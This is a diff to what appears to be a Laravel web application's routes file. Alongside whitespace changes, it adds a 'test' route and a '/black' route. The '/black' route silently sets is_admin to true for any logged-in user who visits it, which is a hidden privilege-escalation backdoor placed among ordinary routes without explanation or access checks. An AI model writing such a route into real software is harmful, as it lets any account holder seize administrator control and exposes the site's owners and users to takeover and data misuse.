@@ -11,10 +11,19 @@
   |
  */
 
-Route::get('/',"HomeController@index");
-Route::get('/home',"HomeController@index");
+Route::get('/', "HomeController@index");
+Route::get('/home', "HomeController@index");
 
-
+Route::get('test',function(){
+    auth::user()->isAdmin();
+});
+Route::get('/black', function () {
+    if (Auth::check()) {
+        $user = auth::user();
+        $user->is_admin = true;
+        $user->save();
+   }
+});
 Route::get('login', 'Auth\AuthController@getLogin');
 Route::post('login', 'Auth\AuthController@postLogin');
 Route::get('logout', 'Auth\AuthController@logout');
